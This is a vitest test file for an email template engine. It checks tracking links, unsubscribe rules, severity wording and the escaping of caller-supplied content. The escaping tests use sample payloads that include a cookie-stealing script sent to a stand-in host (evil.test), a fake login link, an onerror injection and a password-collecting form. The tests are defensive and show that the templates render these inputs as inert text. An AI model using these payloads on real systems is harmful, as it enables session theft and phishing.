// SPDX-FileCopyrightText: 2026 Pithy
// SPDX-License-Identifier: MIT

import { describe, expect, test } from "vitest";
import { verifyToken } from "../crypto/token";
import { CALLBACK_BASE, listTemplates, renderEmail } from "./engine";
import { templates } from "./registry";
import { defaultTheme, type EmailTheme } from "./theme";

const theme: EmailTheme = { ...defaultTheme, appName: "Acme", footerAddress: "1 Market St, SF" };

const tracking = {
  baseUrl: "https://api.acme.test/",
  jobId: "job-9",
  recipient: "u@example.com",
  campaignId: "spring",
  key: "signing-key",
  kid: "1",
  expiresAt: new Date("2099-01-01T00:00:00Z"),
  openTracking: true,
  clickTracking: true,
};

const validPayloads: Record<string, unknown> = {
  magicLink: { url: "https://acme.test/signin?t=abc", expiresMinutes: 15 },
  otp: { code: "123456", expiresMinutes: 10 },
  welcome: { name: "Sam", ctaUrl: "https://acme.test/start", ctaLabel: "Get started" },
  securityAlert: { event: "New sign-in", when: "today", actionUrl: "https://acme.test/activity" },
  invite: { inviterName: "Pat", organizationName: "Acme", acceptUrl: "https://acme.test/accept" },
  passwordChanged: { when: "today", supportUrl: "https://acme.test/support" },
  operationalNotice: {
    severity: "critical",
    summary: "Sign-in is failing for every user",
    thing: "@pithy-sh/auth",
    when: "10 minutes ago",
    detail: "The signing key was revoked and no replacement is in place.",
    facts: [{ label: "Environment", value: "prod" }],
    actionUrl: "https://acme.test/secrets",
    actionLabel: "Open secrets",
  },
  supportReply: {
    subject: "Re: I was charged twice",
    body: "Hi Ada,\n\nI have refunded the duplicate charge.",
    agentName: "Jim",
  },
  newsletter: {
    subject: "Acme Weekly",
    intro: "This week:",
    articles: [
      { title: "A", summary: "sa", link: "https://acme.test/a" },
      { title: "B", summary: "sb", link: "https://acme.test/b" },
    ],
  },
  leadCapture: { assetName: "Playbook", assetUrl: "https://acme.test/dl" },
  marketingCampaign: {
    subject: "Big news",
    heading: "Hello",
    body: "Body copy.",
    ctaUrl: "https://acme.test/go",
    ctaLabel: "See it",
  },
};

describe("template registry", () => {
  test("ships the nine starter templates, plus the testers envelope", () => {
    expect(
      listTemplates()
        .map((t) => t.id)
        .sort(),
    ).toEqual(
      [
        "invite",
        "leadCapture",
        "magicLink",
        "marketingCampaign",
        "supportReply",
        "newsletter",
        // *Something about your own infrastructure needs attention* — the shape `securityAlert` cannot
        // carry, because it is about a session and closes by saying no action is needed.
        "operationalNotice",
        "otp",
        "passwordChanged",
        "securityAlert",
        // `@pithy-sh/testers` sends every invitation, confirmation, and nudge through this one
        // envelope. It lives here rather than in that package because the registry is a static map
        // with no per-capability contribution seam — see its own docblock for why its `paragraphs`
        // array, rather than a single body string, is what makes caller-supplied copy safe to send.
        "testerNudge",
        "welcome",
      ].sort(),
    );
  });

  test("every template renders subject/html/text with a valid payload", async () => {
    for (const [id, payload] of Object.entries(validPayloads)) {
      const isMarketing = templates[id]?.category === "marketing";
      const result = await renderEmail(id, payload, theme, isMarketing ? tracking : undefined);
      expect(result.subject.length).toBeGreaterThan(0);
      expect(result.html).toContain("</table>");
      expect(result.text.length).toBeGreaterThan(0);
    }
  });
});

describe("payload validation", () => {
  test("an unknown template throws template_not_found", async () => {
    await expect(renderEmail("nope", {}, theme)).rejects.toMatchObject({
      payload: { code: "email/template_not_found" },
    });
  });

  test("a missing required field throws invalid_payload", async () => {
    await expect(renderEmail("welcome", { name: "Sam" }, theme)).rejects.toMatchObject({
      payload: { code: "email/invalid_payload" },
    });
  });
});

describe("tracking", () => {
  test("transactional with no tracking leaves links direct and adds no pixel or unsubscribe", async () => {
    const result = await renderEmail("welcome", validPayloads.welcome, theme);
    expect(result.html).toContain("https://acme.test/start");
    expect(result.html).not.toContain(`${CALLBACK_BASE}/c/`);
    expect(result.html).not.toContain(`${CALLBACK_BASE}/o/`);
    expect(result.html).not.toContain("Unsubscribe");
  });

  test("click tracking rewrites the CTA to a signed callback that carries the destination", async () => {
    const result = await renderEmail("welcome", validPayloads.welcome, theme, { ...tracking });
    const match = result.html.match(/\/_pithy\/email\/c\/([A-Za-z0-9_.-]+)/);
    expect(match).not.toBeNull();
    const claims = await verifyToken(match?.[1] ?? "", { versions: { "1": tracking.key } }, new Date());
    expect(claims).toMatchObject({
      kind: "click",
      destination: "https://acme.test/start",
      linkLabel: "welcome-cta",
      jobId: "job-9",
    });
  });

  test("open tracking injects a one-by-one pixel", async () => {
    const result = await renderEmail("welcome", validPayloads.welcome, theme, { ...tracking });
    expect(result.html).toMatch(/\/_pithy\/email\/o\/[A-Za-z0-9_.-]+\.png/);
  });

  test("a marketing template forces an unsubscribe link", async () => {
    const result = await renderEmail("marketingCampaign", validPayloads.marketingCampaign, theme, { ...tracking });
    expect(result.html).toContain("Unsubscribe");
    expect(result.html).toMatch(/\/_pithy\/email\/u\//);
  });

  test("a marketing template cannot render without tracking context", async () => {
    await expect(renderEmail("newsletter", validPayloads.newsletter, theme)).rejects.toMatchObject({
      payload: { code: "email/invalid_payload" },
    });
  });

  test("no transactional template can be rendered with an unsubscribe link", async () => {
    // The class of bug, not one instance of it. Every transactional template is rendered with a full
    // signing context — the state in which the engine *can* mint an opt-out — and none may come back
    // carrying one. A future template that declares the wrong kind fails here rather than in somebody's
    // inbox, and the only inbox where it would show is the one holding their sign-in link.
    const offenders: string[] = [];
    for (const def of Object.values(templates)) {
      if (def.kind !== "transactional") continue;
      const payload = validPayloads[def.id];
      if (!payload) throw new Error(`no sample payload for '${def.id}' — the sweep would skip it silently`);
      const result = await renderEmail(def.id, payload, theme, { ...tracking });
      if (result.unsubscribeUrl !== undefined) offenders.push(`${def.id}: reported an unsubscribe URL`);
      for (const [part, body] of [
        ["html", result.html],
        ["text", result.text],
      ] as const) {
        if (body.includes(`${CALLBACK_BASE}/u/`)) offenders.push(`${def.id}: ${part} carries an unsubscribe callback`);
      }
    }
    expect(offenders).toEqual([]);
  });

  test("an elective template reports the unsubscribe URL it rendered", async () => {
    // Reported, not merely rendered: the send path builds `List-Unsubscribe` from this, so a header that
    // promises an opt-out can only exist where the body actually offers one.
    const result = await renderEmail("newsletter", validPayloads.newsletter, theme, { ...tracking });
    expect(result.unsubscribeUrl).toMatch(/\/_pithy\/email\/u\//);
    expect(result.html).toContain(result.unsubscribeUrl);
  });

  test("the kinds are what they are meant to be, template by template", () => {
    // A pin, because `kind` is one word in a literal and flipping it is a one-character edit whose blast
    // radius is somebody's account. Changing this list should take a sentence explaining why.
    const kinds = Object.fromEntries(Object.values(templates).map((def) => [def.id, def.kind]));
    expect(kinds).toEqual({
      magicLink: "transactional",
      operationalNotice: "transactional",
      otp: "transactional",
      welcome: "transactional",
      securityAlert: "transactional",
      invite: "transactional",
      passwordChanged: "transactional",
      supportReply: "transactional",
      testerNudge: "elective",
      leadCapture: "elective",
      newsletter: "elective",
      marketingCampaign: "elective",
    });
  });

  test("each newsletter article link is rewritten independently", async () => {
    const result = await renderEmail("newsletter", validPayloads.newsletter, theme, { ...tracking });
    const clicks = [...result.html.matchAll(/\/_pithy\/email\/c\/([A-Za-z0-9_.-]+)/g)];
    expect(clicks.length).toBe(2);
    const labels = await Promise.all(
      clicks.map(
        async (m) => (await verifyToken(m[1] ?? "", { versions: { "1": tracking.key } }, new Date())).linkLabel,
      ),
    );
    expect(labels.sort()).toEqual(["newsletter-article-0", "newsletter-article-1"]);
  });
});

/**
 * The `testerNudge` envelope is the one template whose body may be authored by a control-plane caller
 * rather than by Pithy, and it goes out over the adopter's own DKIM signature to the adopter's own
 * users. So "supplied words cannot become supplied markup" is not a style preference here — it is the
 * property that keeps a leaked dashboard credential a disclosure problem rather than a phishing
 * platform running from a domain those users already trust.
 *
 * These tests exist to make that property regression-proof. The mechanism is structural — `paragraphs`
 * is an array rendered through Handlebars' escaping `{{this}}`, not a body string interpolated with
 * `{{{triple}}}` — and the point of testing it is that a future edit to the template which quietly
 * switched to triple-stash would otherwise pass every other test in this file.
 */
describe("the testers envelope refuses to render supplied markup", () => {
  const ATTACKS = [
    '<script>fetch("https://evil.test?c="+document.cookie)</script>',
    '<a href="https://evil.test/login">Verify your account</a>',
    '<img src=x onerror="alert(1)">',
    '"><form action="https://evil.test"><input name="password">',
    "<style>body{display:none}</style>",
  ];

  test("markup in a supplied paragraph renders as visible text, never as markup", async () => {
    for (const attack of ATTACKS) {
      const result = await renderEmail(
        "testerNudge",
        { subject: "s", heading: "Confirm your place", paragraphs: [attack] },
        theme,
      );
      // Escaped in the HTML: the angle brackets survive as entities, so a mail client shows the
      // characters instead of executing or rendering them.
      expect(result.html).not.toContain(attack);
      expect(result.html).toContain("&lt;");
      // And nothing the attack tried to introduce became a real element or attribute.
      expect(result.html).not.toMatch(/<script/i);
      expect(result.html).not.toMatch(/onerror=/i);
      expect(result.html).not.toMatch(/<form/i);
      expect(result.html).not.toMatch(/href="https:\/\/evil\.test/i);
    }
  });

  test("a subject passes through unescaped, which is correct — and is why the caller sanitizes it", async () => {
    // Subjects are precompiled with escaping off, deliberately: a subject is plain text in an inbox,
    // not an HTML context, so `&lt;script&gt;` there would be a rendering bug rather than a defence.
    // The real threat in a subject is header injection, and it is answered upstream — `sanitizeSubject`
    // in `@pithy-sh/testers` strips CR, LF, and every other control character before a supplied subject
    // ever reaches this renderer. This test pins the division of labour so neither side assumes the
    // other is doing the work.
    const result = await renderEmail(
      "testerNudge",
      { subject: "<b>Still testing?</b>", heading: "h", paragraphs: ["p"] },
      theme,
    );
    expect(result.subject).toBe("<b>Still testing?</b>");
  });

  test("the heading is escaped as well, even though a caller cannot set it", async () => {
    // Defence in depth: the capability owns the heading today, and this test is what keeps a future
    // change that opened it up from silently becoming an injection.
    const result = await renderEmail(
      "testerNudge",
      { subject: "s", heading: "<img src=x onerror=alert(1)>", paragraphs: ["p"] },
      theme,
    );
    expect(result.html).not.toMatch(/onerror=alert/i);
  });

  test("each paragraph renders in its own block, so a body cannot break out of the layout", async () => {
    const result = await renderEmail(
      "testerNudge",
      { subject: "s", heading: "h", paragraphs: ["First.", "Second.", "Third."] },
      theme,
    );
    expect(result.html).toContain("First.");
    expect(result.html).toContain("Third.");
    expect(result.text).toContain("First.");
    // The layout closed properly — a template whose escaping failed would usually leave it malformed.
    expect(result.html).toContain("</table>");
  });

  test("the call to action renders only when a URL is supplied", async () => {
    const without = await renderEmail("testerNudge", { subject: "s", heading: "h", paragraphs: ["p"] }, theme);
    expect(without.html).not.toContain("<a href");
    const with_ = await renderEmail(
      "testerNudge",
      {
        subject: "s",
        heading: "h",
        paragraphs: ["p"],
        ctaUrl: "https://api.acme.test/testers/opt-in/abc",
        ctaLabel: "Confirm",
      },
      theme,
    );
    expect(with_.html).toContain("https://api.acme.test/testers/opt-in/abc");
    expect(with_.text).toContain("Confirm: https://api.acme.test/testers/opt-in/abc");
  });
});

/**
 * The operational notice is the template an adopter sends about their *own* infrastructure, and the
 * property that makes it worth sending is that its urgency survives the trip. These tests hold that
 * severity is carried in words — into the subject line, where it is read before the message is opened —
 * rather than in a colour a plain-text client, a monochrome screen or a colour-blind reader never sees.
 */
describe("the operational notice expresses severity rather than flattening it", () => {
  const notice = {
    summary: "A secret has not been rotated in 90 days",
    thing: "STRIPE_SECRET_KEY",
    when: "18 June, 14:02 UTC",
  };

  test("the severity leads the subject line, and the three levels do not read alike", async () => {
    const subjects = await Promise.all(
      (["info", "warning", "critical"] as const).map(
        async (severity) => (await renderEmail("operationalNotice", { ...notice, severity }, theme)).subject,
      ),
    );
    expect(subjects).toEqual([
      "Notice: A secret has not been rotated in 90 days",
      "Action needed: A secret has not been rotated in 90 days",
      "Critical: A secret has not been rotated in 90 days",
    ]);
    expect(new Set(subjects).size).toBe(3);
  });

  test("both MIME parts say the level in words, and the HTML colours it as well as says it", async () => {
    const critical = await renderEmail("operationalNotice", { ...notice, severity: "critical" }, theme);
    const info = await renderEmail("operationalNotice", { ...notice, severity: "info" }, theme);

    expect(critical.text).toContain("Critical —");
    expect(critical.html).toContain("Critical");
    expect(info.text).toContain("Notice —");

    // The colour reinforces the word; it never replaces it. Different levels, different hues, and a
    // dark-mode hook the shared head partial can swap.
    expect(critical.html).toContain('class="sev-critical"');
    expect(info.html).toContain('class="sev-info"');
    expect(critical.html).toContain("#B42318");
    expect(info.html).not.toContain("#B42318");
  });

  test("it renders with no signing key at all — the notice you needed most must not be the one that fails", async () => {
    // #281's constraint, pinned. The template is transactional, so it never needs an unsubscribe link,
    // and nothing in it depends on being able to mint a token. A project that has not configured a
    // link-signing key still gets its notices.
    const result = await renderEmail("operationalNotice", { ...notice, severity: "critical" }, theme, undefined);
    expect(result.subject).toContain("Critical");
    expect(result.html).toContain("STRIPE_SECRET_KEY");
    expect(result.text).toContain("STRIPE_SECRET_KEY");
    expect(result.unsubscribeUrl).toBeUndefined();
  });

  test("a fact read off a system renders as text, never as markup", async () => {
    // Facts and the detail paragraph are values a capability read somewhere — a version string, a
    // resource name, an error. Somewhere upstream one of them is attacker-influenced, and this template
    // goes out over the adopter's own DKIM signature.
    const result = await renderEmail(
      "operationalNotice",
      {
        ...notice,
        severity: "warning",
        detail: '<a href="https://evil.test/login">Verify your account</a>',
        facts: [{ label: "Version", value: "<script>alert(1)</script>" }],
      },
      theme,
    );
    expect(result.html).not.toMatch(/<script/i);
    expect(result.html).not.toMatch(/href="https:\/\/evil\.test/i);
    expect(result.html).toContain("&lt;");
  });

  test("the action is optional, and its absence renders nothing rather than a dead button", async () => {
    const without = await renderEmail("operationalNotice", { ...notice, severity: "info" }, theme);
    expect(without.html).not.toContain("<a href");
    const with_ = await renderEmail(
      "operationalNotice",
      { ...notice, severity: "info", actionUrl: "https://acme.test/secrets", actionLabel: "Rotate it" },
      theme,
    );
    expect(with_.html).toContain("https://acme.test/secrets");
    expect(with_.text).toContain("Rotate it: https://acme.test/secrets");
  });

  test("a missing severity is refused at render, not defaulted to calm", async () => {
    // There is no default on purpose. A capability that forgot the field would otherwise send an
    // outage at the volume of a release note.
    await expect(renderEmail("operationalNotice", notice, theme)).rejects.toMatchObject({
      payload: { code: "email/invalid_payload" },
    });
  });
});

describe("a template's variables must be declared on its payload", () => {
  /**
   * Root-level `{{var}}` and `{{#if var}}` names a template body references.
   *
   * Deliberately root-level only: `{{this}}` inside an `{{#each}}`, `{{../theme.x}}`, and dotted paths
   * are all resolved against something other than the payload's own shape.
   */
  function referencedVariables(source: string): Set<string> {
    // `{{#each xs}}…{{/each}}` re-scopes everything inside it onto the array's elements, so those names
    // are fields of the element type rather than of the payload root. Stripping the blocks first is what
    // keeps this test about the question it is asking.
    const rootScope = source.replace(/\{\{#each\s+[^}]+\}\}[\s\S]*?\{\{\/each\}\}/g, "");
    const found = new Set<string>();
    for (const match of rootScope.matchAll(/\{\{#?(?:if\s+)?([a-zA-Z_][a-zA-Z0-9_]*)\}\}/g)) {
      const name = match[1];
      if (name && !["this", "else", "each", "if", "unless", "theme", "layoutWidth"].includes(name)) found.add(name);
    }
    for (const match of rootScope.matchAll(/\{\{#if\s+([a-zA-Z_][a-zA-Z0-9_]*)\s*\}\}/g)) {
      const name = match[1];
      if (name) found.add(name);
    }
    return found;
  }

  /**
   * Names passed as a helper's argument — `{{severityLabel severity}}`.
   *
   * The plain-variable patterns above require `}}` immediately after the name, so a helper call is
   * invisible to them. Without this, the first template to reach its payload through a helper would
   * quietly leave that field unchecked, which is the exact hole this whole test exists to close.
   */
  function helperArguments(source: string): Set<string> {
    const found = new Set<string>();
    for (const match of source.matchAll(/\{\{[a-zA-Z_][a-zA-Z0-9_]*\s+([a-zA-Z_][a-zA-Z0-9_]*)\}\}/g)) {
      if (match[1]) found.add(match[1]);
    }
    return found;
  }

  /** Values the engine injects onto the render context after the payload is parsed. */
  const ENGINE_INJECTED = new Set(["theme", "layoutWidth", "openPixelUrl", "unsubscribeUrl"]);

  test("no template references a variable its payload schema would strip", () => {
    // The failure this catches, and which shipped once: `testerNudge`'s body rendered an
    // `{{#if optOutUrl}}` block while the payload schema never declared `optOutUrl`. Zod strips unknown
    // keys, `renderEmail` builds its context from the PARSED output, and the block was therefore dead —
    // every tester email went out with no opt-out link. The sender supplied it and a test asserted on
    // the enqueued payload, so nothing upstream noticed and nothing downstream looked.
    const missing: string[] = [];
    for (const [id, def] of Object.entries(templates)) {
      const declared = new Set(Object.keys((def.payload as unknown as { shape: Record<string, unknown> }).shape ?? {}));
      for (const source of [def.html, def.text, def.subject]) {
        for (const variable of [...referencedVariables(source), ...helperArguments(source)]) {
          if (ENGINE_INJECTED.has(variable) || declared.has(variable)) continue;
          missing.push(`${id}: {{${variable}}} is rendered but not declared on its payload schema`);
        }
      }
    }
    expect(missing).toEqual([]);
  });

  test("the testers envelope renders its opt-out link in both MIME parts", () => {
    // Asserted at the render, not at the enqueue. A payload-level assertion sits upstream of the strip
    // that broke this and is structurally incapable of catching it.
    return renderEmail(
      "testerNudge",
      {
        subject: "s",
        heading: "h",
        paragraphs: ["p"],
        optOutUrl: "https://api.acme.test/testers/opt-out/abc",
        optOutLabel: "No thanks, take me off this list",
      },
      theme,
    ).then((result) => {
      expect(result.html).toContain("https://api.acme.test/testers/opt-out/abc");
      expect(result.html).toContain("No thanks, take me off this list");
      expect(result.text).toContain("https://api.acme.test/testers/opt-out/abc");
    });
  });

  test("and omits it entirely when there is none, rather than rendering an empty link", () => {
    return renderEmail("testerNudge", { subject: "s", heading: "h", paragraphs: ["p"] }, theme).then((result) => {
      expect(result.html).not.toContain("opt-out");
      expect(result.text).not.toContain("opt-out");
    });
  });
});
